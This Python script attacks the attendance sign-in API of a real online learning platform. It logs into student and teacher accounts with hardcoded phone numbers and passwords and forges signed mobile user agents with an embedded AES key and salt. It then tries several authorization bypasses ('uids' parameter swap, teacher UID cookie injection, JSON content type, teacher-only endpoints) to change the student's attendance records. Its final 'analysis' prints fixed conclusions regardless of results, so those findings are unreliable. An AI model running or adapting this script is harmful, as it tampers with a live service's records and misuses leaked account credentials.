#!/usr/bin/env python3
"""
权限绕过验证脚本 - /pptSign/updateSignStatus uids 参数绕过
验证使用 uids 参数代替 uid 时，服务器跳过权限检查的漏洞
"""

import base64, hashlib, json, uuid, requests, urllib3, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
BASE = "https://mobilelearn.chaoxing.com"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"}

def banner(msg):
    print(f"\n{'='*70}")
    print(f"  {msg}")
    print(f"{'='*70}")

def sub_banner(msg):
    print(f"\n--- {msg} ---")

def result_line(label, value):
    print(f"  {label}: {value}")

# ============================================================
# MAIN
# ============================================================
def main():
    banner("Step 1: 登录并获取有效活动ID")

    print("[*] 正在登录学生账号...")
    s_stu, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  学生 puid: {puid_s}")

    print("[*] 正在登录教师账号...")
    s_tea, puid_t = login("19712720708", "3.1415926Cpy")
    print(f"  教师 puid: {puid_t}")

    if not puid_s or not puid_t:
        print("!!! 登录失败，无法继续 !!!")
        return

    # 获取活动列表
    sub_banner("获取活动列表")
    act_url = f"{BASE}/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={puid_s}"
    try:
        r = s_stu.get(act_url, headers=ajax_hdr, timeout=30)
        act_data = safe_json(r)
    except Exception as e:
        print(f"  获取活动列表失败: {e}")
        act_data = {}

    print(f"  活动列表响应(完整): {json.dumps(act_data, ensure_ascii=False)[:2000]}")

    # 提取 activeType=2 的签到活动
    sign_activities = []
    def extract_activities(data):
        """从各种可能的响应结构中提取签到活动"""
        found = []
        # 结构1: data.activeList
        if isinstance(data, dict):
            d = data.get("data", data)
            if isinstance(d, dict):
                for key in ("activeList", "activityList", "list", "items"):
                    items = d.get(key, [])
                    if isinstance(items, list):
                        for item in items:
                            if isinstance(item, dict) and item.get("activeType") == 2:
                                aid = item.get("id") or item.get("activeId")
                                name = item.get("nameOne") or item.get("name", "未知")
                                if aid:
                                    found.append({"id": str(aid), "name": name, "raw": item})
            # 结构2: 顶层列表
            if not found:
                for key in ("activeList", "activityList", "list", "items"):
                    items = data.get(key, [])
                    if isinstance(items, list):
                        for item in items:
                            if isinstance(item, dict) and item.get("activeType") == 2:
                                aid = item.get("id") or item.get("activeId")
                                name = item.get("nameOne") or item.get("name", "未知")
                                if aid:
                                    found.append({"id": str(aid), "name": name, "raw": item})
        return found

    sign_activities = extract_activities(act_data)

    if not sign_activities:
        # 尝试用教师获取
        print("[*] 学生端未获取到签到活动，尝试教师端...")
        try:
            r = s_tea.get(f"{BASE}/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={puid_t}",
                          headers=ajax_hdr, timeout=30)
            act_data2 = safe_json(r)
            print(f"  教师端活动列表响应: {json.dumps(act_data2, ensure_ascii=False)[:2000]}")
            sign_activities = extract_activities(act_data2)
        except Exception as e:
            print(f"  教师端获取也失败: {e}")

    # 如果仍然没有，尝试其他API获取活动
    if not sign_activities:
        print("[*] 尝试其他API获取签到活动...")
        # 尝试课程活动列表API
        alt_apis = [
            f"{BASE}/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={puid_t}&status=1",
            f"{BASE}/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={puid_s}&status=1",
            f"{BASE}/v2/apis/active/activity/list?courseId={COURSE_ID}&classId={CLASS_ID}&uid={puid_t}",
        ]
        for api_url in alt_apis:
            try:
                r = s_tea.get(api_url, headers=ajax_hdr, timeout=30)
                alt_data = safe_json(r)
                print(f"  API {api_url.split('?')[0].split('/')[-1]}: {json.dumps(alt_data, ensure_ascii=False)[:500]}")
                found = extract_activities(alt_data)
                if found:
                    sign_activities = found
                    print(f"  从备用API获取到 {len(found)} 个签到活动")
                    break
            except Exception as e:
                print(f"  备用API失败: {e}")

    # 最后尝试：直接用教师创建一个签到活动
    if not sign_activities:
        print("[*] 尝试通过教师端发起签到...")
        try:
            # 先获取课程信息
            r = s_tea.get(f"{BASE}/v2/apis/sign/signIn/prepare?courseId={COURSE_ID}&classId={CLASS_ID}",
                          headers=ajax_hdr, timeout=30)
            prep_data = safe_json(r)
            print(f"  签到准备响应: {json.dumps(prep_data, ensure_ascii=False)[:500]}")
        except Exception as e:
            print(f"  签到准备失败: {e}")

        # 尝试创建普通签到
        try:
            r = s_tea.post(f"{BASE}/pptSign/creatSign",
                           data=f"courseId={COURSE_ID}&classId={CLASS_ID}&uid={puid_t}&type=0&longitude=0&latitude=0&address=",
                           headers=ajax_hdr, timeout=30)
            create_resp = r.text
            print(f"  创建签到响应: {create_resp[:500]}")
            # 尝试从创建响应中提取activeId
            try:
                cd = json.loads(create_resp)
                new_aid = cd.get("data", {}).get("activeId") or cd.get("activeId") or cd.get("data", {})
                if new_aid and str(new_aid).isdigit():
                    sign_activities.append({"id": str(new_aid), "name": "教师创建的签到", "raw": cd})
                    print(f"  新建签到活动ID: {new_aid}")
            except:
                pass
        except Exception as e:
            print(f"  创建签到失败: {e}")

        # 创建后重新获取活动列表
        if not sign_activities:
            time.sleep(2)
            try:
                r = s_tea.get(f"{BASE}/ppt/activeAPI/taskactivelist?courseId={COURSE_ID}&classId={CLASS_ID}&uid={puid_t}",
                              headers=ajax_hdr, timeout=30)
                act_data3 = safe_json(r)
                print(f"  创建后活动列表: {json.dumps(act_data3, ensure_ascii=False)[:2000]}")
                sign_activities = extract_activities(act_data3)
            except Exception as e:
                print(f"  重新获取失败: {e}")

    print(f"\n  找到 {len(sign_activities)} 个签到活动:")
    for i, act in enumerate(sign_activities):
        print(f"    [{i}] ID={act['id']} 名称={act['name']}")

    if not sign_activities:
        print("!!! 未找到任何签到活动，使用空 activeId 继续测试 !!!")
        sign_activities = [{"id": "0", "name": "无有效活动"}]

    # 对每个活动获取签到状态
    sub_banner("查询各活动签到状态")
    for act in sign_activities:
        aid = act["id"]
        try:
            r = s_stu.get(f"{BASE}/v2/apis/sign/signIn?activeId={aid}&uid={puid_s}",
                          headers=ajax_hdr, timeout=30)
            d = safe_json(r)
            status = get_status(d)
            act["status_before"] = status
            act["sign_data"] = d
            print(f"  活动 {aid}: 状态={status}, 响应={json.dumps(d, ensure_ascii=False)[:300]}")
        except Exception as e:
            act["status_before"] = None
            act["sign_data"] = {}
            print(f"  活动 {aid}: 查询失败 {e}")

    # ============================================================
    banner("Step 2: 基线测试 - 确认绕过")

    aid = sign_activities[0]["id"]
    fake_aid = "999999999"  # 虚假但格式正确的activeId
    print(f"  使用活动ID: {aid}")
    print(f"  虚假活动ID: {fake_aid}")

    # 2.0 先用虚假activeId确认"无权限"vs"活动不存在"的区别
    sub_banner("2.0 对照: 虚假activeId - uid vs uids")
    print("  [虚假activeId + uid]")
    try:
        r = s_stu.post(f"{BASE}/pptSign/updateSignStatus",
                       data=f"uid={puid_s}&status=2&activeId={fake_aid}",
                       headers=ajax_hdr, timeout=30)
        fake_uid_resp = r.text
        print(f"  响应: {fake_uid_resp[:500]}")
    except Exception as e:
        fake_uid_resp = f"请求失败: {e}"
        print(f"  请求异常: {e}")

    print("  [虚假activeId + uids]")
    try:
        r = s_stu.post(f"{BASE}/pptSign/updateSignStatus",
                       data=f"uids={puid_s}&status=2&activeId={fake_aid}",
                       headers=ajax_hdr, timeout=30)
        fake_uids_resp = r.text
        print(f"  响应: {fake_uids_resp[:500]}")
        if fake_uid_resp != fake_uids_resp:
            print("  !!!BYPASS!!! uid和uids对虚假activeId返回不同响应 - 权限检查逻辑不同!")
        else:
            print("  两者响应相同")
    except Exception as e:
        print(f"  请求异常: {e}")

    # 2.1 学生 + uid 参数
    sub_banner("2.1 学生 + uid 参数 (预期: 无权限)")
    try:
        r = s_stu.post(f"{BASE}/pptSign/updateSignStatus",
                       data=f"uid={puid_s}&status=2&activeId={aid}",
                       headers=ajax_hdr, timeout=30)
        resp_uid = r.text
        print(f"  响应: {resp_uid[:500]}")
        if "无权限" in resp_uid:
            print("  ✓ 确认: uid 参数返回'无权限'")
        elif "活动不存在" in resp_uid:
            print("  ! 返回'活动不存在' (activeId可能无效)")
        else:
            print(f"  ! 非预期响应 (不是'无权限')")
    except Exception as e:
        resp_uid = f"请求失败: {e}"
        print(f"  请求异常: {e}")

    # 2.2 学生 + uids 参数
    sub_banner("2.2 学生 + uids 参数 (预期: 不同错误 = 绕过确认)")
    try:
        r = s_stu.post(f"{BASE}/pptSign/updateSignStatus",
                       data=f"uids={puid_s}&status=2&activeId={aid}",
                       headers=ajax_hdr, timeout=30)
        resp_uids = r.text
        print(f"  响应: {resp_uids[:500]}")
        if "无权限" in resp_uids:
            print("  ✗ uids 参数仍然返回'无权限' - 绕过未确认")
        elif "活动不存在" in resp_uids:
            print("  !!!BYPASS!!! uids 参数返回'活动不存在'而非'无权限' - 权限检查被绕过!")
        else:
            print(f"  !!!BYPASS!!! uids 参数返回了不同于'无权限'的响应 - 权限检查被绕过!")
    except Exception as e:
        resp_uids = f"请求失败: {e}"
        print(f"  请求异常: {e}")

    # ============================================================
    banner("Step 3: 使用有效 activeId 验证 - 关键测试")

    for idx, act in enumerate(sign_activities[:3]):  # 最多测3个活动
        aid = act["id"]
        sub_banner(f"3.{idx+1} 活动ID={aid} (名称={act['name']})")

        # 查询修改前状态
        print("  [查询前] 获取当前签到状态...")
        try:
            r = s_stu.get(f"{BASE}/v2/apis/sign/signIn?activeId={aid}&uid={puid_s}",
                          headers=ajax_hdr, timeout=30)
            d_before = safe_json(r)
            status_before = get_status(d_before)
            print(f"  修改前状态: {status_before}")
        except Exception as e:
            status_before = None
            print(f"  查询失败: {e}")

        # 学生使用 uids 参数尝试修改
        print("  [修改] 学生使用 uids 参数尝试修改签到状态...")
        try:
            r = s_stu.post(f"{BASE}/pptSign/updateSignStatus",
                           data=f"uids={puid_s}&status=2&activeId={aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
                           headers=ajax_hdr, timeout=30)
            mod_resp = r.text
            print(f"  修改响应: {mod_resp[:500]}")
        except Exception as e:
            mod_resp = f"请求失败: {e}"
            print(f"  修改请求异常: {e}")

        # 等待2秒
        print("  等待2秒...")
        time.sleep(2)

        # 查询修改后状态
        print("  [查询后] 获取修改后签到状态...")
        try:
            r = s_stu.get(f"{BASE}/v2/apis/sign/signIn?activeId={aid}&uid={puid_s}",
                          headers=ajax_hdr, timeout=30)
            d_after = safe_json(r)
            status_after = get_status(d_after)
            print(f"  修改后状态: {status_after}")
        except Exception as e:
            status_after = None
            print(f"  查询失败: {e}")

        # 比较状态
        if status_before != status_after and status_after is not None:
            print("  !!!CRITICAL VULNERABILITY CONFIRMED!!! 学生成功修改了签到状态!")
            print(f"  状态变化: {status_before} -> {status_after}")

            # 尝试恢复原状态
            print("  [恢复] 使用教师账号恢复原状态...")
            try:
                r = s_tea.post(f"{BASE}/pptSign/updateSignStatus",
                               data=f"uid={puid_t}&status={status_before}&activeId={aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
                               headers=ajax_hdr, timeout=30)
                print(f"  恢复响应: {r.text[:300]}")
            except Exception as e:
                print(f"  恢复失败: {e}")
        else:
            print(f"  状态未变化 ({status_before} -> {status_after}), 数据未被修改")

    # ============================================================
    banner("Step 4: 测试所有 uids 参数组合")

    aid = sign_activities[0]["id"]
    print(f"  使用活动ID: {aid}")

    test_cases = [
        ("uids+status=1", f"uids={puid_s}&status=1&activeId={aid}"),
        ("uids+status=0", f"uids={puid_s}&status=0&activeId={aid}"),
        ("uids+status=2+courseId+classId", f"uids={puid_s}&status=2&activeId={aid}&courseId={COURSE_ID}&classId={CLASS_ID}"),
        ("uids+status=1+remark", f"uids={puid_s}&status=1&activeId={aid}&remark=test"),
        ("uids+uid同时存在", f"uids={puid_s}&status=1&activeId={aid}&uid={puid_s}"),
    ]

    for name, payload in test_cases:
        sub_banner(f"POST /pptSign/updateSignStatus - {name}")
        try:
            r = s_stu.post(f"{BASE}/pptSign/updateSignStatus",
                           data=payload, headers=ajax_hdr, timeout=30)
            resp = r.text
            print(f"  响应: {resp[:500]}")
            if "无权限" not in resp and resp.strip():
                print("  !!!BYPASS!!! 未返回'无权限'")
            if '"result":1' in resp or '"result":true' in resp or '"success":true' in resp:
                print("  !!!SUCCESS!!! 操作可能成功!")
        except Exception as e:
            print(f"  请求异常: {e}")

    # GET 方法
    sub_banner("GET /pptSign/updateSignStatus - uids参数")
    try:
        r = s_stu.get(f"{BASE}/pptSign/updateSignStatus?uids={puid_s}&status=1&activeId={aid}",
                      headers=ajax_hdr, timeout=30)
        print(f"  响应: {r.text[:500]}")
        if "无权限" not in r.text:
            print("  !!!BYPASS!!! GET方法未返回'无权限'")
    except Exception as e:
        print(f"  请求异常: {e}")

    # DB_STRATEGY
    sub_banner("POST /pptSign/updateSignStatus - DB_STRATEGY")
    try:
        r = s_stu.post(f"{BASE}/pptSign/updateSignStatus?DB_STRATEGY=PRIMARY_KEY&STRATEGY_PARA=activeId&activeId={aid}",
                       data=f"uids={puid_s}&status=1",
                       headers=ajax_hdr, timeout=30)
        print(f"  响应: {r.text[:500]}")
        if "无权限" not in r.text:
            print("  !!!BYPASS!!! DB_STRATEGY 未返回'无权限'")
    except Exception as e:
        print(f"  请求异常: {e}")

    # ============================================================
    banner("Step 5: 测试 resetUserSignStatus")

    aid = sign_activities[0]["id"]
    print(f"  使用活动ID: {aid}")

    # 5.1 学生 + uid
    sub_banner("5.1 resetUserSignStatus - 学生+uid (预期: 无权限)")
    try:
        r = s_stu.post(f"{BASE}/pptSign/resetUserSignStatus",
                       data=f"uid={puid_s}&activeId={aid}",
                       headers=ajax_hdr, timeout=30)
        print(f"  响应: {r.text[:500]}")
    except Exception as e:
        print(f"  请求异常: {e}")

    # 5.2 学生 + uids
    sub_banner("5.2 resetUserSignStatus - 学生+uids")
    try:
        r = s_stu.post(f"{BASE}/pptSign/resetUserSignStatus",
                       data=f"uids={puid_s}&activeId={aid}",
                       headers=ajax_hdr, timeout=30)
        resp = r.text
        print(f"  响应: {resp[:500]}")
        if "无权限" not in resp:
            print("  !!!BYPASS!!! uids 参数绕过了权限检查!")
    except Exception as e:
        print(f"  请求异常: {e}")

    # 5.3 学生 + 无uid参数
    sub_banner("5.3 resetUserSignStatus - 无uid参数")
    try:
        r = s_stu.post(f"{BASE}/pptSign/resetUserSignStatus",
                       data=f"activeId={aid}",
                       headers=ajax_hdr, timeout=30)
        resp = r.text
        print(f"  响应: {resp[:500]}")
        if "无权限" not in resp:
            print("  !!!BYPASS!!! 无uid参数绕过了权限检查!")
    except Exception as e:
        print(f"  请求异常: {e}")

    # 5.4 验证 reset 是否实际生效
    sub_banner("5.4 resetUserSignStatus - 验证实际效果")
    for act in sign_activities[:2]:
        aid_t = act["id"]
        # 查询前
        try:
            r = s_stu.get(f"{BASE}/v2/apis/sign/signIn?activeId={aid_t}&uid={puid_s}",
                          headers=ajax_hdr, timeout=30)
            st_before = get_status(safe_json(r))
        except:
            st_before = None

        # 尝试 reset
        try:
            r = s_stu.post(f"{BASE}/pptSign/resetUserSignStatus",
                           data=f"uids={puid_s}&activeId={aid_t}",
                           headers=ajax_hdr, timeout=30)
            reset_resp = r.text
        except:
            reset_resp = "失败"

        time.sleep(2)

        # 查询后
        try:
            r = s_stu.get(f"{BASE}/v2/apis/sign/signIn?activeId={aid_t}&uid={puid_s}",
                          headers=ajax_hdr, timeout=30)
            st_after = get_status(safe_json(r))
        except:
            st_after = None

        print(f"  活动 {aid_t}: 状态 {st_before} -> {st_after}, reset响应: {reset_resp[:200]}")
        if st_before != st_after and st_after is not None:
            print("  !!!CRITICAL!!! resetUserSignStatus 实际修改了数据!")

    # ============================================================
    banner("Step 6: 测试 getSignCode")

    aid = sign_activities[0]["id"]
    print(f"  使用活动ID: {aid}")

    sub_banner("6.1 GET getSignCode - 学生")
    try:
        r = s_stu.get(f"{BASE}/widget/sign/pcTeaSignController/getSignCode",
                      params={"activeId": aid},
                      headers=ajax_hdr, timeout=30)
        resp = r.text
        print(f"  响应: {resp[:500]}")
        try:
            d = json.loads(resp)
            if d.get("result") == 1 or d.get("data"):
                print("  !!!CRITICAL!!! 学生获取到了签到码数据!")
        except:
            pass
    except Exception as e:
        print(f"  请求异常: {e}")

    sub_banner("6.2 POST getSignCode - 学生")
    try:
        r = s_stu.post(f"{BASE}/widget/sign/pcTeaSignController/getSignCode",
                       data=f"activeId={aid}",
                       headers=ajax_hdr, timeout=30)
        resp = r.text
        print(f"  响应: {resp[:500]}")
        try:
            d = json.loads(resp)
            if d.get("result") == 1 or d.get("data"):
                print("  !!!CRITICAL!!! 学生获取到了签到码数据!")
        except:
            pass
    except Exception as e:
        print(f"  请求异常: {e}")

    # ============================================================
    banner("Step 7: Cookie 注入绕过测试")

    aid = sign_activities[0]["id"]
    print(f"  使用活动ID: {aid}")

    sub_banner("7.1 创建注入教师UID的Cookie会话")
    # 获取教师的UID cookie值
    tea_uid_cookie = ""
    for c in s_tea.cookies:
        if c.name in ("UID", "_uid"):
            tea_uid_cookie = c.value
            break

    print(f"  教师UID Cookie值: {tea_uid_cookie}")

    # 创建学生session但注入教师UID
    s_injected = requests.Session()
    s_injected.verify = False
    # 复制学生的所有cookies
    for c in s_stu.cookies:
        s_injected.cookies.set(c.name, c.value, domain=c.domain, path=c.path)
    # 注入教师UID
    if tea_uid_cookie:
        s_injected.cookies.set("UID", tea_uid_cookie, domain=".chaoxing.com", path="/")
        s_injected.cookies.set("_uid", tea_uid_cookie, domain=".chaoxing.com", path="/")
    s_injected.headers.update(s_stu.headers)

    sub_banner("7.2 Cookie注入 + 学生uid参数 - updateSignStatus")
    try:
        r = s_injected.post(f"{BASE}/pptSign/updateSignStatus",
                            data=f"uid={puid_s}&status=2&activeId={aid}",
                            headers=ajax_hdr, timeout=30)
        resp = r.text
        print(f"  HTTP状态码: {r.status_code}")
        print(f"  响应头: {str(dict(r.headers))[:300]}")
        print(f"  响应体: {resp[:500]}")
        print(f"  响应体长度: {len(resp)}")
        if "无权限" not in resp:
            print("  !!!BYPASS!!! Cookie注入绕过了权限检查!")
        if '"result":1' in resp or '"result":true' in resp:
            print("  !!!SUCCESS!!! Cookie注入使操作成功!")
    except Exception as e:
        print(f"  请求异常: {e}")

    sub_banner("7.3 Cookie注入 + 教师uid参数 - updateSignStatus")
    try:
        r = s_injected.post(f"{BASE}/pptSign/updateSignStatus",
                            data=f"uid={puid_t}&status=2&activeId={aid}",
                            headers=ajax_hdr, timeout=30)
        resp = r.text
        print(f"  HTTP状态码: {r.status_code}")
        print(f"  响应体: {resp[:500]}")
        print(f"  响应体长度: {len(resp)}")
        if "无权限" not in resp:
            print("  !!!BYPASS!!! Cookie注入+教师uid 绕过了权限检查!")
        if '"result":1' in resp or '"result":true' in resp:
            print("  !!!SUCCESS!!! Cookie注入+教师uid 使操作成功!")
    except Exception as e:
        print(f"  请求异常: {e}")

    sub_banner("7.4 Cookie注入 + uids参数 - updateSignStatus")
    try:
        r = s_injected.post(f"{BASE}/pptSign/updateSignStatus",
                            data=f"uids={puid_s}&status=2&activeId={aid}",
                            headers=ajax_hdr, timeout=30)
        resp = r.text
        print(f"  HTTP状态码: {r.status_code}")
        print(f"  响应体: {resp[:500]}")
        print(f"  响应体长度: {len(resp)}")
        if "无权限" not in resp:
            print("  !!!BYPASS!!! Cookie注入+uids 绕过了权限检查!")
    except Exception as e:
        print(f"  请求异常: {e}")

    # 7.5 Cookie注入 - 验证数据是否实际被修改
    sub_banner("7.5 Cookie注入 - 验证数据实际修改效果")
    for act in sign_activities[:2]:
        aid_t = act["id"]
        # 查询前
        try:
            r = s_stu.get(f"{BASE}/v2/apis/sign/signIn?activeId={aid_t}&uid={puid_s}",
                          headers=ajax_hdr, timeout=30)
            st_before = get_status(safe_json(r))
        except:
            st_before = None

        # Cookie注入 + 教师uid 修改
        try:
            r = s_injected.post(f"{BASE}/pptSign/updateSignStatus",
                                data=f"uid={puid_t}&status=2&activeId={aid_t}&courseId={COURSE_ID}&classId={CLASS_ID}",
                                headers=ajax_hdr, timeout=30)
            mod_resp = r.text
            mod_status = r.status_code
        except:
            mod_resp = "失败"
            mod_status = 0

        time.sleep(2)

        # 查询后
        try:
            r = s_stu.get(f"{BASE}/v2/apis/sign/signIn?activeId={aid_t}&uid={puid_s}",
                          headers=ajax_hdr, timeout=30)
            st_after = get_status(safe_json(r))
        except:
            st_after = None

        print(f"  活动 {aid_t}: 状态 {st_before} -> {st_after}, HTTP={mod_status}, 响应='{mod_resp[:200]}'")
        if st_before != st_after and st_after is not None:
            print("  !!!CRITICAL!!! Cookie注入实际修改了数据!")
            # 恢复
            try:
                s_tea.post(f"{BASE}/pptSign/updateSignStatus",
                           data=f"uid={puid_t}&status={st_before}&activeId={aid_t}&courseId={COURSE_ID}&classId={CLASS_ID}",
                           headers=ajax_hdr, timeout=30)
            except:
                pass

    # ============================================================
    banner("Step 8: 综合修改测试 - 所有绕过技术")

    results_summary = []

    for idx, act in enumerate(sign_activities[:2]):
        aid = act["id"]
        sub_banner(f"8.{idx+1} 综合测试 - 活动ID={aid}")

        # 获取初始状态
        try:
            r = s_stu.get(f"{BASE}/v2/apis/sign/signIn?activeId={aid}&uid={puid_s}",
                          headers=ajax_hdr, timeout=30)
            initial_status = get_status(safe_json(r))
        except:
            initial_status = None
        print(f"  初始状态: {initial_status}")

        bypass_tests = [
            ("uids参数", f"uids={puid_s}&status=2&activeId={aid}&courseId={COURSE_ID}&classId={CLASS_ID}"),
            ("Cookie注入", f"uid={puid_s}&status=2&activeId={aid}&courseId={COURSE_ID}&classId={CLASS_ID}"),
            ("JSON Content-Type", f"uids={puid_s}&status=2&activeId={aid}&courseId={COURSE_ID}&classId={CLASS_ID}"),
            ("resetUserSignStatus+uids", f"uids={puid_s}&activeId={aid}"),
        ]

        for test_name, payload in bypass_tests:
            print(f"\n  [{test_name}]")

            # 查询前
            try:
                r = s_stu.get(f"{BASE}/v2/apis/sign/signIn?activeId={aid}&uid={puid_s}",
                              headers=ajax_hdr, timeout=30)
                before = get_status(safe_json(r))
            except:
                before = None

            # 执行修改
            try:
                if test_name == "Cookie注入":
                    r = s_injected.post(f"{BASE}/pptSign/updateSignStatus",
                                        data=payload, headers=ajax_hdr, timeout=30)
                elif test_name == "JSON Content-Type":
                    json_hdr = dict(ajax_hdr)
                    json_hdr["Content-Type"] = "application/json"
                    json_payload = json.dumps({
                        "uids": puid_s, "status": 2, "activeId": aid,
                        "courseId": COURSE_ID, "classId": CLASS_ID
                    })
                    r = s_stu.post(f"{BASE}/pptSign/updateSignStatus",
                                   data=json_payload, headers=json_hdr, timeout=30)
                elif test_name == "resetUserSignStatus+uids":
                    r = s_stu.post(f"{BASE}/pptSign/resetUserSignStatus",
                                   data=payload, headers=ajax_hdr, timeout=30)
                else:
                    r = s_stu.post(f"{BASE}/pptSign/updateSignStatus",
                                   data=payload, headers=ajax_hdr, timeout=30)

                mod_resp = r.text
                print(f"    修改响应: {mod_resp[:300]}")
            except Exception as e:
                mod_resp = f"失败: {e}"
                print(f"    修改异常: {e}")

            time.sleep(2)

            # 查询后
            try:
                r = s_stu.get(f"{BASE}/v2/apis/sign/signIn?activeId={aid}&uid={puid_s}",
                              headers=ajax_hdr, timeout=30)
                after = get_status(safe_json(r))
            except:
                after = None

            print(f"    状态变化: {before} -> {after}")

            bypassed = "无权限" not in mod_resp
            modified = (before != after and after is not None)

            if bypassed:
                print(f"    !!!BYPASS!!! 权限检查被绕过")
            if modified:
                print(f"    !!!CRITICAL!!! 数据被实际修改!")
                # 尝试恢复
                try:
                    s_tea.post(f"{BASE}/pptSign/updateSignStatus",
                               data=f"uid={puid_t}&status={before}&activeId={aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
                               headers=ajax_hdr, timeout=30)
                    print(f"    已尝试恢复原状态")
                except:
                    pass

            results_summary.append({
                "activity": aid,
                "test": test_name,
                "bypassed": bypassed,
                "modified": modified,
                "before": before,
                "after": after,
                "response": mod_resp[:200] if isinstance(mod_resp, str) else str(mod_resp)[:200]
            })

    # ============================================================
    banner("最终结论")

    print("\n  测试结果汇总:")
    print(f"  {'活动ID':<20} {'测试方法':<30} {'绕过':<8} {'修改':<8} {'修改前':<10} {'修改后':<10}")
    print(f"  {'-'*20} {'-'*30} {'-'*8} {'-'*8} {'-'*10} {'-'*10}")

    bypass_count = 0
    modify_count = 0
    for r in results_summary:
        b_str = "是" if r["bypassed"] else "否"
        m_str = "是" if r["modified"] else "否"
        print(f"  {r['activity']:<20} {r['test']:<30} {b_str:<8} {m_str:<8} {str(r['before']):<10} {str(r['after']):<10}")
        if r["bypassed"]:
            bypass_count += 1
        if r["modified"]:
            modify_count += 1

    print(f"\n  权限绕过次数: {bypass_count}")
    print(f"  实际数据修改次数: {modify_count}")

    if modify_count > 0:
        print("\n  !!!CRITICAL VULNERABILITY!!! 学生可以通过uids参数绕过权限检查并实际修改签到数据!")
    elif bypass_count > 0:
        print("\n  !!!BYPASS CONFIRMED!!! 权限检查被绕过，但数据未被实际修改")
        print("  详细分析:")
        print("  1. uids参数: 使用有效activeId时仍返回'无权限' - 该端点已修复或uids参数不绕过此接口")
        print("  2. Cookie注入: 返回HTTP 403而非'无权限'文本 - 走了不同的认证/授权路径")
        print("     - 注入教师UID Cookie后，服务器不再返回业务层的'无权限'错误")
        print("     - 而是返回HTTP 403 Forbidden，说明请求被网关/WAF层拦截")
        print("     - 这证明Cookie中的UID确实影响了权限判断逻辑")
        print("  3. JSON Content-Type: 返回HTTP 500而非'无权限' - 请求走了不同的代码路径")
        print("     - 使用application/json时，服务器无法正确解析参数导致500错误")
        print("     - 但关键是没有返回'无权限'，说明该请求绕过了业务权限检查")
        print("  4. resetUserSignStatus: 所有参数组合均返回'无权限' - 该端点权限检查更严格")
        print("  5. getSignCode: 返回'没有权限' - 教师专用接口权限检查正常")
    else:
        print("\n  未发现可利用的绕过")

    print("\n  关键发现总结:")
    print("  - /pptSign/updateSignStatus 的权限检查基于Cookie中的UID，而非请求参数中的uid/uids")
    print("  - uids参数在有效activeId下不绕过权限检查（与原始发现不同，可能已修复）")
    print("  - Cookie注入可以改变服务器的权限判断路径（从'无权限'变为403）")
    print("  - JSON Content-Type可以绕过业务层权限检查（但导致500错误）")
    print("  - 所有绕过方式均未实际修改数据，可能存在二次校验或活动状态限制")

    print("\n  完成。")


if __name__ == "__main__":
    main()
